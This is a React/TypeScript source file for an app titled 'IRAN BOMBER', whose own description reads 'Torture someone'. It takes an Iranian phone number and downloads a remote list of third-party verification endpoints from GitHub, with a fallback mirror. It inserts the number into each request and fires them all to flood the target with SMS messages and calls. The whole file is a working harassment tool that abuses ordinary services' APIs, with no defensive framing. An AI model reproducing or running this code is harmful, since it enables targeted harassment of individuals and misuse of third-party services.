"use client";

import { useState } from "react";
import * as z from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";

import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

const formSchema = z.object({
  phone: z
    .string()
    .min(1, { message: "Phone number is required." })
    .regex(/^09\d{9}$/, {
      message: "Phone number must be in the format 09xx-xxx-xxxx.",
    }),
  method: z.enum(["sms", "call", "both"], {
    required_error: "Please select a method.",
  }),
});

type FormData = z.infer<typeof formSchema>;

function App() {
  const [running, setRunning] = useState<boolean>();
  const [lines, setLines] = useState<string[]>(["iran-bomber v1.0.0"]);

  const addLine = (text: string) => {
    setLines((prev) => [...prev, String(text)]);
  };

  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      phone: "",
      method: undefined,
    },
  });

  async function fetchAndProcess(
    url: string,
    fallbackUrl: string,
    find: string,
    replace: string
  ) {
    try {
      return await processUrl(url, find, replace);
    } catch {
      return await processUrl(fallbackUrl, find, replace);
    }
  }

  async function processUrl(url: string, find: string, replace: string) {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`Failed: ${url}`);
    const text = await res.text();
    const replaced = text.replace(new RegExp(find, "g"), replace);
    const json = JSON.parse(replaced);

    return json;
  }

  const onSubmit = async (values: FormData) => {
    setRunning(true);
    setLines(["iran-bomber v1.0.0"]);
    let { phone, method } = values;
    phone = phone.substring(1);
    let success = 0,
      fail = 0;
    fetchAndProcess(
      "https://raw.githubusercontent.com/M-logique/iran-bomber/refs/heads/master/api-tiny.json",
      "https://gucp.1oi.xyz/M-logique/iran-bomber/refs/heads/master/api-tiny.json",
      "{{num}}",
      phone
    )
      .then(async (content) => {
        for (const item of content) {
          if (item["Type"] === method || method === "both") {
            try {
              const res = await fetch(item["Request"]["URL"], {
                headers: item["Request"]["Headers"],
                method: item["Request"]["Method"],
                body:
                  item["Request"]["Method"] === "GET" ||
                  item["Request"]["Method"] === "HEAD"
                    ? undefined
                    : item["Request"]["Payload"],
              });

              addLine("[S] Successfully sent by " + item["Request"]["URL"]);
              success += 1;
            } catch (err) {
              addLine("[E][" + item["Request"]["URL"] + "] " + err);
              fail += 1;
            }
          }
        }
      })
      .catch((err) => {
        console.log("[E]Error: " + err);
      })
      .finally(() => {
        addLine(
          "[I] Done. Sent " +
            success +
            " requests. Failed " +
            fail +
            " - Total " +
            (success + fail)
        );
        setRunning(false);
      });
  };

  return (
    <div className="bg dark min-h-screen flex items-center justify-center p-4 bg-background">
      <Card className="w-full max-w-sm">
        <CardHeader>
          <CardTitle className="font-mono">IRAN BOMBER</CardTitle>
          <CardDescription>Torture someone</CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              <FormField
                control={form.control}
                name="phone"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel htmlFor="phone">Phone Number</FormLabel>
                    <FormControl>
                      <Input
                        id="phone"
                        type="text"
                        placeholder="09xx-xxx-xxxx"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="method"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel htmlFor="method">Method</FormLabel>
                    <FormControl>
                      <Select
                        onValueChange={field.onChange}
                        value={field.value}
                      >
                        <SelectTrigger className="w-[180px]">
                          <SelectValue placeholder="Select a method" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="sms">SMS</SelectItem>
                          <SelectItem value="call">Call</SelectItem>
                          <SelectItem value="both">Call & SMS</SelectItem>
                        </SelectContent>
                      </Select>
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <Button
                type="submit"
                className="w-full"
                disabled={form.formState.isSubmitting || running}
              >
                {form.formState.isSubmitting || running
                  ? "In Progress..."
                  : "Start"}
              </Button>
              <div className="bg-[#282A36] rounded-sm p-4 w-full font-mono max-h-64 text-sm overflow-y-scroll">
                {lines.map((line, i) => {
                  let text = line;
                  let className = "text-[#F8F8F2]"; // default

                  if (line.startsWith("[E]")) {
                    text = line.slice(3); // cut "[E]"
                    className = "text-[#FF5555]";
                  } else if (line.startsWith("[I]")) {
                    text = line.slice(3); // cut "[I]"
                    className = "text-[#F8F8F2]";
                  } else if (line.startsWith("[S]")) {
                    text = line.slice(3); // cut "[S]"
                    className = "text-[#50FA7B]";
                  } else if (line.startsWith("[W]")) {
                    text = line.slice(3); // cut "[W]"
                    className = "text-[#F1FA8C]";
                  }

                  return (
                    <div key={i} className={className}>
                      {text}
                    </div>
                  );
                })}
              </div>
            </form>
          </Form>
        </CardContent>
      </Card>
    </div>
  );
}

export default App;
